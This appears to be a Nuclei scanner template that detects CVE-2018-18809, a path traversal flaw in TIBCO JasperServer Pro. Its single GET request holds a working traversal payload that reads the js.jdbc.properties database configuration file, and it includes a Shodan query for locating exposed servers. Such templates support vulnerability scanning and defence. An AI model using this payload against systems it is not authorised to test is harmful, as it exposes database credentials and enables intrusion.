id: CVE-2018-18809

info:
  name: TIBCO JasperReports Library - Directory Traversal
  author: DhiyaneshDK
  severity: critical
  reference:
    - https://packetstormsecurity.com/files/154406/Tibco-JasperSoft-Path-Traversal.html
    - https://security.elarlang.eu/cve-2018-18809-path-traversal-in-tibco-jaspersoft.html
    - https://nvd.nist.gov/vuln/detail/CVE-2018-18809
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"jasperserver-pro"
  tags: cve,cve2018,lfi,kev,jasperserver,jasperreport

http:
  - method: GET
    path:
      - "{{BaseURL}}/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "metadata.jdbc.driverClassName"
          - "metadata.hibernate.dialect"
        condition: and

      - type: status
        status:
          - 200
